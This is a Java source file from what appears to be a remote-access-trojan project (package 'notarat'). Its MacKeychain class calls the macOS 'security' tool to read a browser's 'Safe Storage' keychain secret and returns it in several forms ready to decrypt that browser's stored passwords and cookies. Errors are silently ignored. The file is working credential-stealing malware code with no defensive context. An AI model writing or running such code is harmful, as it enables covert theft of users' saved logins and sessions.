package dev.xotic.notarat.crypto;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.TimeUnit;

public final class MacKeychain {

    private static final boolean DEBUG = Boolean.getBoolean("notarat.debug");

    public static List<byte[]> fetchAll(String browser) {
        List<byte[]> out = new ArrayList<>();
        String label = cap(browser) + " Safe Storage";

        try {
            Process p = new ProcessBuilder(
                    "security", "find-generic-password",
                    "-s", label, "-w")
                    .redirectErrorStream(true).start();
            StringBuilder sb = new StringBuilder();
            try (BufferedReader r = new BufferedReader(
                    new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = r.readLine()) != null) sb.append(line).append('\n');
            }
            if (!p.waitFor(15, TimeUnit.SECONDS)) { p.destroyForcibly(); return out; }
            if (p.exitValue() != 0) return out;

            String secret = sb.toString().trim();
            if (secret.isEmpty()) return out;

            try {
                byte[] decoded = Base64.getDecoder().decode(secret);
                if (decoded.length > 0) {
                    out.add(decoded);
                    if (decoded.length > 16) out.add(Arrays.copyOf(decoded, 16));
                }
            } catch (IllegalArgumentException ignored) {}

            out.add(secret.getBytes(StandardCharsets.UTF_8));
        } catch (Exception ignored) {
        }
        return out;
    }

    private static String cap(String s) {
        if (s == null || s.isEmpty()) return s;
        return Character.toUpperCase(s.charAt(0)) + s.substring(1).toLowerCase();
    }

    private MacKeychain() {}
}